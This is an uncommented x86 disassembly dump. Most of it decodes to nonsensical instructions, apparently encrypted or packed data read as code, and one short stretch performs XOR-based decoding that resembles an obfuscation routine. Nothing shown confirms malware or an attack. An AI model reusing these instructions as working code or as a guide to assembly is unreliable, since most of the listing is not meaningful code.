  4092ef:	call   0x6215:0xf879234c
  4092f6:	out    0xea,eax
  4092f8:	dec    esi
  4092f9:	arpl   WORD PTR [ebx+0x282aea35],di
  4092ff:	in     eax,dx
  409300:	bound  ebx,QWORD PTR [esi-0x7f07fc2c]
  409306:	shr    DWORD PTR [edx],cl
  409308:	adc    ecx,ebx
  40930a:	cmp    al,0xc1
  40930c:	inc    esi
  40930d:	dec    ecx
  40930e:	jmp    0x4092c4
  409310:	daa    
  409311:	xor    al,0x28
  409313:	jp     0x409301
  409315:	pop    edx
  409316:	push   cx
  409318:	sahf   
  409319:	js     0x40929c
  40931b:	push   es
  40931c:	mov    bh,0x7
  40931e:	test   DWORD PTR [eax],ebp
  409320:	add    BYTE PTR [ecx+0xa],0xce
  409324:	cld    
  409325:	mov    ch,0xe2
  409327:	pop    ebp
  409328:	pusha  
  409329:	test   dh,al
  40932b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40932c:	xor    dh,BYTE PTR [edx+esi*8]
  40932f:	cmc    
  409330:	test   al,0x25
  409332:	cmp    BYTE PTR [edx],bl
  409334:	push   cs
  409335:	or     BYTE PTR [ecx+edi*8],bh
  409338:	dec    ebp
  409339:	ffree  st(7)
  40933b:	shl    DWORD PTR [ebx+0x515ad70f],0x77
  409342:	or     BYTE PTR [eax+0x3a],dl
  409345:	sbb    DWORD PTR [edi+0x3750f85c],0xffffff91
  40934c:	adc    eax,DWORD PTR [ebx+0x5e]
  40934f:	mov    cl,0x16
  409351:	js     0x4092f8
  409353:	and    ch,BYTE PTR [ebx-0x6dfb51f3]
  409359:	fs aad 0x46
  40935c:	push   edi
  40935d:	test   DWORD PTR [ecx+0x28b68b4d],ebx
  409363:	es int 0xc4
  409366:	into   
  409367:	mov    eax,0x7f4114dd
  40936c:	imul   esi,esi,0xfa2737d9
  409372:	cmp    edx,DWORD PTR [esi-0xaff3cd5]
  409378:	cdq    
  409379:	mov    bl,0x58
  40937b:	loopne 0x40939d
  40937d:	inc    edx
  40937e:	cwde   
  40937f:	mov    ds:0x81354eb,eax
  409384:	test   eax,0xe1bda980
  409389:	out    dx,eax
  40938a:	or     BYTE PTR [ecx-0x20ab0e2],bh
  409390:	or     ch,ah
  409392:	cmp    ebp,DWORD PTR [edx-0x98cd684]
  409398:	dec    ebx
  409399:	(bad)  
  40939a:	icebp  
  40939b:	xor    DWORD PTR fs:[edx-0xe5b6be8],edi
  4093a2:	jmp    0x4093b7
  4093a4:	adc    DWORD PTR [edx-0x47],eax
  4093a7:	or     DWORD PTR [ebx],ebp
  4093a9:	pop    esi
  4093aa:	in     al,dx
  4093ab:	(bad)  
  4093ac:	arpl   di,ax
  4093ae:	or     DWORD PTR [edx-0x9],ebx
  4093b1:	stos   BYTE PTR es:[edi],al
  4093b2:	push   es
  4093b3:	int3   
  4093b4:	in     eax,0x2a
  4093b6:	cwde   
  4093b7:	xchg   edi,eax
  4093b8:	jmp    0x40937b
  4093ba:	mov    edi,ecx
  4093bc:	enter  0x7f0b,0x80
  4093c0:	ror    BYTE PTR [eax],1
  4093c2:	adc    eax,0xce105c89
  4093c7:	mov    bl,0x64
  4093c9:	mov    al,ds:0x6705a54c
  4093ce:	jne    0x409435
  4093d0:	jecxz  0x409439
  4093d2:	sbb    eax,esp
  4093d4:	mov    al,0x6e
  4093d6:	js     0x4093bf
  4093d8:	mov    eax,DWORD PTR [esp+esi*1-0x36]
  4093dc:	xor    esp,eax
  4093de:	leave  
  4093df:	call   FWORD PTR [esi+0x78]
  4093e2:	(bad)  
  4093e3:	outs   dx,BYTE PTR ds:[esi]
  4093e4:	cmp    BYTE PTR [edx+eiz*1],ah
  4093e7:	pop    esp
  4093e8:	xor    eax,0xfc1160cd
  4093ed:	add    cl,BYTE PTR [esi-0x7b34c95e]
  4093f3:	mov    ah,0xd7
  4093f5:	dec    eax
  4093f6:	pusha  
  4093f7:	push   ds
  4093f8:	mov    cl,0x38
  4093fa:	jg     0x40939b
  4093fc:	or     DWORD PTR [edx],ebp
  4093fe:	cmp    al,0xf3
  409400:	pop    eax
  409401:	mov    esi,0x77a5ab22
  409406:	mov    esp,0x1970ca26
  40940b:	loop   0x40944c
  40940d:	scas   eax,DWORD PTR es:[edi]
  40940e:	xchg   ecx,eax
  40940f:	out    0x86,eax
  409411:	pop    edi
  409412:	pop    dx
  409414:	fwait
  409415:	jbe    0x4093bc
  409417:	push   ecx
  409418:	mov    ebx,0x2a8b4059
  40941d:	xchg   esp,eax
  40941e:	add    DWORD PTR [esi-0xab04ec4],0x7df2ffb0
  409428:	loopne 0x409494
  40942a:	push   esp
  40942b:	sti    
  40942c:	mov    bh,0x70
  40942e:	cwde   
  40942f:	std    
  409430:	ins    BYTE PTR es:[edi],dx
  409431:	or     DWORD PTR [edi],edx
  409433:	sbb    dh,BYTE PTR [ebx+0x1e]
  409436:	iret   
  409437:	sub    edx,esp
  409439:	pop    edx
  40943a:	sub    al,0xa2
  40943c:	in     al,0x30
  40943e:	and    BYTE PTR [edx],cl
  409440:	adc    DWORD PTR [ebx+0x4c],ebp
  409443:	sub    DWORD PTR [edx-0x6],ebx
  409446:	pop    esi
  409447:	ins    BYTE PTR es:[edi],dx
  409448:	retf   0xf408
  40944b:	not    DWORD PTR [ecx]
  40944d:	(bad)  
  40944e:	mov    ds:0x228d147c,eax
  409453:	loop   0x40940f
  409455:	sub    esp,DWORD PTR [ebx-0xb]
  409458:	clc    
  409459:	pop    ebp
  40945a:	sbb    dh,BYTE PTR [edi+0x16]
  40945d:	repnz mov esi,0x686885d2
  409463:	leave  
  409464:	adc    eax,0x1c4e8b5b
  409469:	mov    al,0x11
  40946b:	sbb    DWORD PTR [ecx+edx*8],0xb5f75543
  409472:	add    al,0x56
  409474:	fimul  WORD PTR [edx]
  409476:	mov    edx,DWORD PTR cs:[edi+0x33]
  40947a:	mov    al,0xb8
  40947c:	into   
  40947d:	rcr    DWORD PTR [esi],cl
  40947f:	ss cli 
  409481:	mov    ebx,0x2ee9abeb
  409486:	or     ebx,DWORD PTR [edx+0x236c6f9d]
  40948c:	aad    0xc6
  40948e:	xchg   edi,eax
  40948f:	fstp   st(7)
  409491:	add    ebp,DWORD PTR [esi]
  409493:	retf   0xfca5
  409496:	pop    ebx
  409497:	xchg   esi,eax
  409498:	or     al,0x5d
  40949a:	push   esi
  40949b:	and    DWORD PTR [ebx+0x33],ebx
  40949e:	xor    cl,BYTE PTR [esi-0x19b219ca]
  4094a4:	and    eax,0xd51d4311
  4094a9:	mov    ebx,0x7ccfb281
  4094ae:	aam    0x72
  4094b0:	sbb    ebx,DWORD PTR [eax-0x3bb20a41]
  4094b6:	(bad)  
  4094b7:	push   esp
  4094b8:	jbe    0x40946d
  4094ba:	(bad)  
  4094bb:	into   
  4094bc:	mov    bl,0x9f
  4094be:	cmp    al,0xff
  4094c0:	inc    ebx
  4094c1:	xor    al,0xdb
  4094c3:	rcl    BYTE PTR [eax+esi*4-0x77ef52a7],cl
  4094ca:	mov    eax,0x2d15f092
  4094cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094d0:	mov    ebp,0xec9ad9ae
  4094d5:	ja     0x4094e4
  4094d7:	dec    ecx
  4094d8:	loope  0x409473
  4094da:	clc    
  4094db:	sbb    al,0xc7
  4094dd:	sbb    eax,0x4a2ce4d9
  4094e2:	fsubrp st(3),st
  4094e4:	jbe    0x40947f
  4094e6:	mov    dl,0xa2
  4094e8:	cmp    al,BYTE PTR [ecx+0xd]
  4094eb:	sub    al,ah
  4094ed:	js     0x40956d
  4094ef:	xlat   BYTE PTR ds:[ebx]
  4094f0:	data16 mov al,ds:0x2348be53
  4094f6:	aam    0xcb
  4094f8:	(bad)
  4094fb:	dec    esp
  4094fc:	and    DWORD PTR [edx+esi*1],ebp
  4094ff:	mov    cl,BYTE PTR [ebp+0x74c36e19]
  409505:	dec    ecx
  409506:	cmc    
  409507:	idiv   BYTE PTR [edi-0x30]
  40950a:	mov    ds:0xe2860305,al
  40950f:	out    0xb,al
  409511:	sbb    ebx,DWORD PTR [ebx]
  409513:	std    
  409514:	into   
  409515:	(bad)  
  409516:	jp     0x40952a
  409518:	add    eax,0xee0b6e77
  40951d:	pop    eax
  40951e:	xchg   esi,eax
  40951f:	retf   
  409520:	cmp    DWORD PTR [edi-0x3df5b190],edi
  409526:	or     al,0xea
  409528:	mov    ah,0xce
  40952a:	jmp    0x40951e
  40952c:	adc    eax,DWORD PTR [edi+0x0]
  40952f:	popf   
  409530:	(bad)  
  409531:	mov    ss,ecx
  409533:	xlat   BYTE PTR ds:[ebx]
  409534:	jl     0x409589
  409536:	in     eax,0x69
  409538:	fs add al,0xd5
  40953b:	xor    eax,esi
  40953d:	mov    dh,0xcb
  40953f:	pop    esi
  409540:	sub    al,0xaf
  409542:	push   edx
  409543:	or     BYTE PTR [edi*2+0x77e7b976],bh
  40954a:	jl     0x409544
  40954c:	bound  edx,QWORD PTR [ebx-0x5a4724ad]
  409552:	and    bh,BYTE PTR [edi-0x20]
  409555:	loopne 0x4095c6
  409557:	sbb    al,0xdf
  409559:	pop    ss
  40955a:	bound  ebx,QWORD PTR [ebx]
  40955c:	sbb    dl,BYTE PTR [esi+0x1be1a324]
  409562:	mov    ebp,0x3378b9b2
  409567:	xor    al,BYTE PTR [edi-0xe]
  40956a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40956b:	shl    cl,1
  40956d:	jb     0x4095aa
  40956f:	fucom  st(0)
  409571:	test   al,0xe9
  409573:	push   cs
  409574:	fmul   DWORD PTR ds:[edx]
  409577:	jecxz  0x409598
  409579:	fsubrp st(1),st
  40957b:	mov    al,0x8a
  40957d:	test   dl,bl
  40957f:	add    ch,BYTE PTR [ebx-0x35]
  409582:	sahf   
  409583:	add    eax,0x202b1693
  409588:	push   edi
  409589:	dec    esp
  40958a:	xor    BYTE PTR [ecx+eax*2-0xe6fe331],0x24
  409592:	cmp    dl,cl
  409594:	fiadd  WORD PTR ds:[ecx+ebx*2]
  409598:	mov    eax,0x35b895c0
  40959d:	xchg   edx,eax
  40959e:	sahf   
  40959f:	iret   
  4095a0:	inc    edi
  4095a1:	sub    DWORD PTR [ebx],esp
  4095a3:	push   ecx
  4095a4:	cli    
  4095a5:	or     ebx,esp
  4095a7:	jg     0x40961e
  4095a9:	fsubrp st(7),st
  4095ab:	mov    al,0xf8
  4095ad:	mov    ch,0x7a
  4095af:	inc    esi
  4095b0:	mul    BYTE PTR [edi]
  4095b2:	or     eax,0x20f4890a
  4095b7:	or     DWORD PTR [edi],ebp
  4095b9:	push   esp
  4095ba:	mov    ebp,0x6ab1c436
  4095bf:	ret    0x105a
  4095c2:	sbb    al,0x9b
  4095c4:	dec    edi
  4095c5:	mov    dl,BYTE PTR [ebx*8-0x727bd312]
  4095cc:	call   0x5b37:0x6396e120
  4095d3:	and    eax,0xaad5f85e
  4095d8:	lock jmp 0x2579d114
  4095de:	(bad)  
  4095df:	jmp    0xb824:0xdfeb2dc2
  4095e6:	push   edi
  4095e7:	jne    0x4095fb
  4095e9:	repnz leave 
  4095eb:	or     dh,BYTE PTR [ebp+0x2b64073]
  4095f1:	sub    BYTE PTR [edx-0x25],0x2d
  4095f5:	ss push esp
  4095f7:	cli    
  4095f8:	jp     0x4095e9
  4095fa:	push   esi
  4095fb:	pushf  
  4095fc:	push   ebx
  4095fd:	pop    ss
  4095fe:	sub    BYTE PTR [eax-0x7c],dl
  409601:	mov    edi,0x8821606d
  409606:	rcr    BYTE PTR [edx+0x24a66b53],0x9f
  40960d:	mov    ebp,0x8d91e75e
  409612:	pop    es
  409613:	pop    esp
  409614:	mov    dl,0xb6
  409616:	adc    eax,0x331a2463
  40961b:	ret    0xe339
  40961e:	adc    DWORD PTR [eax+0x38],esp
  409621:	cmp    cl,BYTE PTR [edi*2-0x281fe2d]
  409628:	ss repnz ins DWORD PTR es:[edi],dx
  40962b:	mov    edx,DWORD PTR [esi]
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422548
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0xcbca5c6
  4097de:	loope  0x4097f0
  4097e0:	jle    0x409829
  4097e2:	inc    ecx
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [esi+0x7cf9ec3c],ch
  4097ee:	inc    eax
  4097ef:	mov    bh,0x98
  4097f1:	test   DWORD PTR [esi-0x4a69588b],edx
  4097f7:	ins    DWORD PTR es:[edi],dx
  4097f8:	jno    0x409836
  4097fa:	daa    
  4097fb:	popa   
  4097fc:	stos   BYTE PTR es:[edi],al
  4097fd:	cdq    
  4097fe:	ret    0x7ec4
  409801:	push   edi
  409802:	xor    eax,0x3ce6f9ac
  409807:	test   eax,0xe6e63019
  40980c:	imul   esp,esi,0x4aeb85d6
  409812:	or     edi,DWORD PTR [esi]
  409814:	sbb    al,0x19
  409816:	test   al,bh
  409818:	imul   DWORD PTR [ecx]
  40981a:	and    ch,dl
  40981c:	retf   0xbc3
  40981f:	xor    dl,BYTE PTR [edx]
  409821:	push   ecx
  409822:	pop    ss
  409823:	xchg   esp,eax
  409824:	ret    
  409825:	into   
  409826:	pop    edi
  409827:	mov    ebp,0xf0326f32
  40982c:	jo     0x4097e4
  40982e:	cmp    eax,0xc36bb631
  409833:	xlat   BYTE PTR ds:[ebx]
  409834:	aam    0x80
  409836:	pop    ebp
  409837:	fwait
  409838:	rcl    BYTE PTR [esi+0x77039e86],0x7b
  40983f:	xor    bl,BYTE PTR [edi+0x610bcca4]
  409845:	(bad)  
  409847:	or     DWORD PTR [edi],ebp
  409849:	ffree  st(1)
  40984b:	cmp    eax,0xa615c683
  409850:	push   eax
  409851:	push   ds
  409852:	inc    ebp
  409853:	sbb    BYTE PTR [edx+edi*2+0x70c1684b],cl
  40985a:	pop    edx
  40985b:	inc    ecx
  40985c:	fiadd  WORD PTR [edx+0x3c]
  40985f:	pop    esp
  409860:	dec    edi
  409861:	iret   
  409862:	std    
  409863:	cmp    al,0x8b
  409865:	cs out dx,al
  409867:	(bad)  
  409869:	mov    edi,gs
  40986b:	stos   DWORD PTR es:[edi],eax
  40986c:	jo     0x409854
  40986e:	psubb  mm3,QWORD PTR [esi]
  409871:	mov    esi,DWORD PTR [edi]
  409873:	dec    ebx
  409874:	and    DWORD PTR ds:0x148486b0,esi
  40987a:	cs or  al,0xb6
  40987d:	int    0xe1
  40987f:	jecxz  0x409847
  409881:	loope  0x4098f8
  409883:	ins    DWORD PTR es:[edi],dx
  409884:	ss jae 0x40989c
  409887:	shr    BYTE PTR [edi-0x77],cl
  40988a:	mov    bh,0x75
  40988c:	pop    edi
  40988d:	pop    ss
  40988e:	daa    
  40988f:	mov    edi,0xdae96dfd
  409894:	test   ebp,ebp
  409896:	stc    
  409897:	sub    DWORD PTR [ecx-0x2],eax
  40989a:	sbb    BYTE PTR ds:[eax-0x69bcaad9],dl
  4098a1:	pop    ebp
  4098a2:	loop   0x409855
  4098a4:	ja     0x409878
  4098a6:	sub    DWORD PTR [ebp-0x31],ebp
  4098a9:	scas   eax,DWORD PTR es:[edi]
  4098aa:	jmp    0xe781:0xb467ce72
  4098b1:	mov    ds:0x1f2dbfba,al
  4098b6:	mov    al,0xdf
  4098b8:	test   eax,0x6ccbd4c1
  4098bd:	xchg   edx,eax
  4098be:	popf   
  4098bf:	inc    ebx
  4098c0:	mov    ?,esp
  4098c2:	cmp    dh,0xc3
  4098c5:	xchg   esp,eax
  4098c6:	pop    edi
  4098c7:	inc    ebx
  4098c8:	adc    DWORD PTR [eiz*2+0x10eac3bc],esi
  4098cf:	sub    BYTE PTR ds:0x2846cc82,cl
  4098d5:	scas   al,BYTE PTR es:[edi]
  4098d6:	or     bh,BYTE PTR [edi+ebp*2]
  4098d9:	cmc    
  4098da:	xchg   edi,eax
  4098db:	add    al,0x97
  4098dd:	mov    esi,edi
  4098df:	out    dx,al
  4098e0:	dec    eax
  4098e1:	imul   eax,esi,0xffffffa7
  4098e4:	repz inc eax
  4098e6:	sahf   
  4098e7:	or     DWORD PTR [edx+0x550aead3],0x6c
  4098ee:	sbb    BYTE PTR [edi],0x67
  4098f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098f2:	mov    bh,0x33
  4098f4:	pop    es
  4098f5:	dec    ecx
  4098f6:	mov    al,0xf0
  4098f8:	cmp    esi,DWORD PTR [eax]
  4098fa:	aas    
  4098fb:	jle    0x40993c
  4098fd:	gs je  0x40997d
  409900:	stos   BYTE PTR es:[edi],al
  409901:	jnp    0x409952
  409903:	dec    ecx
  409904:	lock xor esi,ecx
  409907:	jae    0x409934
  409909:	shl    BYTE PTR [edx+0x3d454eba],0xe6
  409910:	push   edi
  409911:	adc    BYTE PTR fs:[edx-0x29b06edb],0x2d
  409919:	add    eax,0x4095b9f2
  40991e:	test   edx,ecx
  409920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409921:	repz or eax,0xda6acbc8
  409927:	loop   0x4098ac
  409929:	or     ebp,ecx
  40992b:	push   esp
  40992c:	and    eax,0xf5e34a45
  409931:	fiadd  DWORD PTR [esi-0x17790af7]
  409937:	ja     0x4098d6
  409939:	cmp    BYTE PTR [esi],cl
  40993b:	scas   eax,DWORD PTR es:[edi]
  40993c:	js     0x4099b4
  40993e:	iret   
  40993f:	call   0x4604e55f
  409944:	mov    DWORD PTR [ebp+0x4],eax
  409947:	dec    ebp
  409948:	lock fwait
  40994a:	cmp    eax,0xab838879
  40994f:	enter  0x9d7a,0x29
  409953:	pushf  
  409954:	add    ebp,0x2f88ea1
  40995a:	jb     0x4099c9
  40995c:	sahf   
  40995d:	into   
  40995e:	pop    es
  40995f:	xchg   ebx,eax
  409960:	loop   0x4098e7
  409962:	daa    
  409963:	cmp    edx,DWORD PTR [esi+0x63]
  409966:	ret    
  409967:	pop    ds
  409968:	(bad)  
  40996a:	dec    edx
  40996b:	jle    0x4099da
  40996d:	test   al,0xc5
  40996f:	push   cs
  409970:	sub    bh,BYTE PTR [ebp+ecx*1+0x7b]
  409974:	xchg   esp,eax
  409975:	ret    
  409976:	or     edx,ebp
  409978:	push   0x4b
  40997a:	mov    eax,ds:0x82c7acdf
  40997f:	gs aas 
  409981:	or     al,0x4b
  409983:	mov    esp,0x3f888282
  409988:	push   0x6a7d4805
  40998d:	add    BYTE PTR [ecx+0x12],al
  409990:	sub    eax,DWORD PTR [ecx-0x6e]
  409993:	xchg   edi,eax
  409994:	jb     0x4099c0
  409996:	add    eax,0x97a7fa65
  40999b:	sbb    eax,0xdc994b92
  4099a0:	mov    DWORD PTR [edx-0x3c],eax
  4099a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099a4:	xchg   edi,eax
  4099a5:	inc    ecx
  4099a6:	rcr    BYTE PTR [esi+0x4566cc77],1
  4099ac:	mov    cl,0x6c
  4099ae:	mov    bh,0x51
  4099b0:	xchg   esp,eax
  4099b1:	sub    eax,0xfa21643d
  4099b6:	push   cs
  4099b7:	inc    edx
  4099b8:	cwde   
  4099b9:	mov    ds:0x6e2b1439,eax
  4099be:	xchg   ebp,eax
  4099bf:	xchg   esp,eax
  4099c0:	scas   al,BYTE PTR es:[edi]
  4099c1:	sar    ebp,cl
  4099c3:	adc    eax,0x88f74cf7
  4099c8:	in     eax,0x61
  4099ca:	mov    ch,0x1d
  4099cc:	jbe    0x409988
  4099ce:	out    0xd1,eax
  4099d0:	inc    ebx
  4099d1:	lods   al,BYTE PTR ds:[esi]
  4099d2:	rcl    DWORD PTR [ecx+ebx*4+0x36],0x3c
  4099d7:	pop    edx
  4099d8:	cmp    DWORD PTR [edi+0x78],esi
  4099db:	cmp    ebx,0xffffff86
  4099de:	adc    esp,DWORD PTR [ebx]
  4099e0:	fs out dx,eax
  4099e2:	fdivr  QWORD PTR [ecx-0x7acd50cb]
  4099e8:	adc    DWORD PTR [esi-0x642fb32a],eax
  4099ee:	mov    esi,0x3d5ac8da
  4099f3:	xor    BYTE PTR [esi+ebp*2-0x73fe6329],bl
  4099fa:	jmp    0x59f9:0x758ba666
  409a01:	and    bl,BYTE PTR [esi-0x6588015]
  409a07:	bound  esp,QWORD PTR [eax-0x3c]
  409a0a:	jbe    0x4099a7
  409a0c:	add    cl,BYTE PTR [esi-0x46d65b35]
  409a12:	lahf   
  409a13:	ins    DWORD PTR es:[edi],dx
  409a14:	mov    ds:0x920fcd6b,eax
  409a19:	jnp    0x409a9a
  409a1b:	loopne 0x409a99
  409a1d:	(bad)  
  409a1e:	test   al,0x77
  409a20:	int    0xd1
  409a22:	std    
  409a23:	jge    0x4099e8
  409a25:	fs inc ebp
  409a27:	jb     0x4099f6
  409a29:	dec    eax
  409a2a:	pop    ds
  409a2b:	aaa    
  409a2c:	fwait
  409a2d:	(bad)
  409a30:	adc    BYTE PTR ds:0x9834c25b,al
  409a36:	jg     0x409a9c
  409a38:	cld    
  409a39:	fs xchg edx,eax
  409a3b:	lods   al,BYTE PTR ds:[esi]
  409a3c:	inc    eax
  409a3d:	fs jl  0x409a61
  409a40:	call   0x733b:0x9f95dc6f
  409a47:	test   DWORD PTR [esi],eax
  409a49:	mov    ah,0x97
  409a4b:	mov    esp,0x20a7c3e8
  409a50:	inc    esp
  409a51:	jge    0x409a84
  409a53:	jo     0x409a21
  409a55:	test   esi,edi
  409a57:	or     al,0x60
  409a59:	int    0x10
  409a5b:	push   cs
  409a5c:	mov    bh,0x28
  409a5e:	mov    cl,0x4e
  409a60:	pop    ebx
  409a61:	jo     0x409ac0
  409a63:	add    DWORD PTR [esp+ebx*2+0x317d76be],esi
  409a6a:	mov    al,0x57
  409a6c:	retf   
  409a6d:	inc    eax
  409a6e:	lods   eax,DWORD PTR ds:[esi]
  409a6f:	cmp    al,0x3c
  409a71:	sub    eax,0x271f2c98
  409a76:	cmp    ch,BYTE PTR [eax+0x42]
  409a79:	mov    bl,0xb2
  409a7b:	lds    ecx,FWORD PTR [edx+0x321f8135]
  409a81:	ret    0x517
  409a84:	and    DWORD PTR [esi+ebp*8+0x4a],eax
  409a88:	xchg   esp,eax
  409a89:	add    esp,ecx
  409a8b:	rcr    BYTE PTR [edx+0x6d8754b9],cl
  409a91:	pop    edx
  409a92:	pop    ds
  409a93:	test   DWORD PTR gs:[ebx-0xb98c463],0xaec71dfc
  409a9e:	scas   al,BYTE PTR es:[edi]
  409a9f:	arpl   si,bp
  409aa1:	dec    edi
  409aa2:	sbb    DWORD PTR [ebx+0x4ee3da94],edi
  409aa8:	xchg   ecx,eax
  409aa9:	imul   ebx,DWORD PTR [ecx-0x2],0xffffffce
  409aad:	mov    ecx,0x8df6579e
  409ab2:	sbb    eax,0xa446f257
  409ab7:	sub    eax,0xdc99b860
  409abc:	dec    ecx
  409abd:	mov    cl,0x42
  409abf:	je     0x409ac9
  409ac1:	rcr    ebp,0xc5
  409ac4:	dec    eax
  409ac6:	call   0xd4087d74
  409acb:	sub    ch,BYTE PTR [edi+0x6e]
  409ace:	or     al,0xa8
  409ad0:	xchg   edi,eax
  409ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad2:	icebp  
  409ad3:	fwait
  409ad4:	inc    edi
  409ad5:	jmp    0xfe52:0xc1674f5f
  409adc:	dec    eax
  409add:	dec    ebp
  409ade:	xlat   BYTE PTR ds:[ebx]
  409adf:	mov    edx,0x1bfe995d
  409ae4:	fld    QWORD PTR [edi+0x5c6cbab4]
  409aea:	dec    ebx
  409aeb:	pop    ebp
  409aec:	aaa    
  409aed:	js     0x409aef
  409aef:	std    
  409af0:	fld    QWORD PTR [esi-0x58]
  409af3:	imul   eax,DWORD PTR [edx],0x3f5c74a3
  409af9:	mov    edi,0x2c9d75ff
  409afe:	pop    ss
